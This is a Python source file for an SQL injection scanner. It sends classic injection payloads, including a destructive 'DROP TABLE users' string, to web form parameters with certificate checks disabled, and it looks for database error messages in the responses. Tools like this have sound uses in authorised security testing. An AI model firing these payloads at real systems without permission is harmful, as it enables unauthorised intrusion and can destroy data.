"""
SQL Injection Testing Tool
Tests for common SQL injection vulnerabilities in web forms
"""

import requests
from datetime import datetime
from src.utils.logger import Logger

logger = Logger.get_logger("SQLInjectionTester")


class SQLInjectionTester:
    """Tests web endpoints for SQL injection vulnerabilities"""
    
    def __init__(self):
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "' OR 1=1 --",
            "' UNION SELECT NULL --",
            "'; DROP TABLE users --",
            "1' AND '1'='1",
        ]
        
        self.timeout = 5
    
    def test_endpoint(self, url, param_name, method='GET', data=None):
        """Test endpoint for SQL injection vulnerability"""
        results = {
            'url': url,
            'parameter': param_name,
            'timestamp': datetime.now().isoformat(),
            'vulnerable': False,
            'payloads_tested': 0,
            'responses': []
        }
        
        try:
            # Test baseline response
            baseline = self._get_response(url, param_name, '', method, data)
            baseline_len = len(baseline) if baseline else 0
            
            for payload in self.payloads:
                results['payloads_tested'] += 1
                
                try:
                    response = self._get_response(url, param_name, payload, method, data)
                    
                    if response and self._analyze_response(response, baseline):
                        results['vulnerable'] = True
                        results['responses'].append({
                            'payload': payload,
                            'status': 'suspicious',
                            'length_diff': len(response) - baseline_len
                        })
                except Exception as e:
                    logger.debug(f"Payload test failed: {str(e)}")
            
        except Exception as e:
            logger.error(f"Testing failed: {str(e)}")
            results['error'] = str(e)
        
        return results
    
    def _get_response(self, url, param_name, payload, method='GET', data=None):
        """Get response from endpoint with payload"""
        try:
            if method.upper() == 'GET':
                params = {param_name: payload}
                resp = requests.get(url, params=params, timeout=self.timeout, verify=False)
            else:
                if data is None:
                    data = {}
                data[param_name] = payload
                resp = requests.post(url, data=data, timeout=self.timeout, verify=False)
            
            return resp.text
        except requests.exceptions.Timeout:
            return None
        except Exception as e:
            logger.debug(f"Response retrieval error: {str(e)}")
            return None
    
    def _analyze_response(self, response, baseline):
        """Check if response indicates injection"""
        if not response:
            return False
        
        # Look for SQL error messages
        error_indicators = [
            'SQL syntax',
            'mysql_fetch',
            'Warning: mysql',
            'ORA-',
            'PostgreSQL',
            'SQLServer',
        ]
        
        for indicator in error_indicators:
            if indicator.lower() in response.lower():
                return True
        
        return False
    
    def test_batch_endpoints(self, endpoints):
        """Test multiple endpoints"""
        results = []
        for endpoint in endpoints:
            result = self.test_endpoint(
                endpoint.get('url'),
                endpoint.get('param'),
                endpoint.get('method', 'GET')
            )
            results.append(result)
        
        return {
            'total_tested': len(endpoints),
            'vulnerable_found': sum(1 for r in results if r.get('vulnerable')),
            'results': results
        }
